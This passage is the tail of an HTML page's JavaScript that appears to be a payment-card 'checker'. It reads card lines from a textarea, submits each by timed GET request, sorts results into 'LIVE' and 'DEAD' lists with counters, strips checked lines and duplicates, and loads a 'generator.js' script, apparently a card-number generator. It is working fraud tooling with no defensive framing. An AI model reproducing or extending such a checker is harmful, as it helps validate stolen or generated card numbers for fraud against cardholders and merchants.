                        type: 'GET',
                        async: true,
                        success: function(result) {
                            if (result.match("#LIVE")) {
                                var result = result.split("#LIVE ");
                                $("#live-div").append('<div class="live"><span class="badge badge-ss"> LIVE </span> ' + value + ' ' + result[1] + '</div>');
                                update();
                                live++;
                            }
                            else if (result.match("#DEAD")) {
                                var result = result.split("#DEAD ");
                                $("#dead-div").append('<div class="dead"><span class="badge badge-ss"> DEAD </span> ' + value + ' ' + result[1] + '</div>');
                                update();
                                dead++;
                            }
                            else {
                                $("#dead-div").append('<div class="dead"><span class="badge badge-ss"> DEAD </span> ' + value + ' ' + result + '</div>');
                                update();
                                dead++;
                            }
                         
                            $('#n-count').html(live);
                            $('#d-count').html(dead);
                        }

                  
                    });
                }, index * 5000);
            });

        });
            function update() {
    var card = $("#cards").val().split("\n");
    card.splice(0, 1);
    $("#cards").val(card.join("\n"));
}

    
 

     
document.getElementById('removeDuplicates').addEventListener('click', function() {
    var textarea = document.getElementById('cards');
    var lines = textarea.value.split('\n');
    var uniqueLines = Array.from(new Set(lines)); // Remove duplicates
    textarea.value = uniqueLines.join('\n');
});

    </script>
    <script src="generator.js" type="text/javascript"></script>

</body>
</html>
